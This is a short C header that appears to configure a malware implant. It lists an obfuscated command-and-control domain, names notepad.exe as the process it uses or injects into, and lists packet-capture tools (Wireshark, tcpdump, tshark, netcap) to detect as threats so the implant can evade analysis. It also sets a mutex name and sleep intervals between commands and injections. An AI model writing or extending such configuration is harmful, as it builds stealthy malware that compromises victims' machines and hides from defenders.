#pragma once
#include "obfuscate.h"
const char* CNC_DOMAINS[] = {
	OBFUSCATE("aloncnc.com")
};

#define PROCESS_NAME OBFUSCATE("notepad.exe")

const char* THREAT_PROCESSES[] = {
	OBFUSCATE("wireshark.exe"),
	OBFUSCATE("tcpdump.exe"),
	OBFUSCATE("tshark.exe"),
	OBFUSCATE("netcap.exe")
};
const char* MUTEX_NAME = "identity_mutex";

const size_t SLEEP_BETWEEN_COMMANDS = 10;

const size_t SLEEP_BETWEEN_INJECTIONS = 60;